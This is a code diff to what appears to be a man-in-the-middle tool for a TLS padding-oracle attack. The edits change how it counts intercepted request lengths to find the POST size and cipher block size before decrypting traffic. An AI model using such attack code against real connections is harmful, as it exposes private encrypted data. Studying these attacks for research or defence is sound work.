@@ -218,6 +218,7 @@ with output(output_type='list', initial_len=6) as output_list:
 			sessions[src_port] = session
 
 			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
+				request_length_count[len(pkt)] = request_length_count[len(pkt)] + 1 if len(pkt) in request_length_count else 0
 
 				# Don't modify pre-flight check
 				if config["skipOptions"] and (option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length)):
@@ -228,9 +229,8 @@ with output(output_type='list', initial_len=6) as output_list:
 					packet.accept()
 					return
 				elif post_request_length is None:
-					log("POST Request Length: " + str(len(pkt)))
-					request_length_count[len(pkt)] = request_length_count[len(pkt)] + 1 if len(pkt) in request_length_count else 0
 					if request_length_count[len(pkt)] > 4:
+						log("POST Request Length: " + str(len(pkt)))
 						post_request_length = len(pkt)
 					else:
 						packet.accept()
@@ -239,15 +239,19 @@ with output(output_type='list', initial_len=6) as output_list:
 				# Stage 1: The JS client is sending packets of increasing length
 				if block_size is None:
 
-					log("Got request length " + str(len(pkt)))
-					if ciphertext_length > 0:
-						data_padding_size_needed += 1
-						if len(pkt) > ciphertext_length:
-							block_size = len(pkt) - ciphertext_length
-							print_state(ciphertext_length)
-							log("Found block size: " + str(block_size))
+					if request_length_count[len(pkt)]:
+						log("Got request length " + str(len(pkt)))
+						if ciphertext_length > 0:
+							data_padding_size_needed += 1
+							if len(pkt) > ciphertext_length:
+								block_size = len(pkt) - ciphertext_length
+								print_state(ciphertext_length)
+								log("Found block size: " + str(block_size))
+						else:
+							ciphertext_length = len(pkt)
 					else:
-						ciphertext_length = len(pkt)
+						packet.accept()
+						return
 
 				# Stage 2: The JS client is sending the same packet repeatedly and waiting for us to decrypt it
 				else:
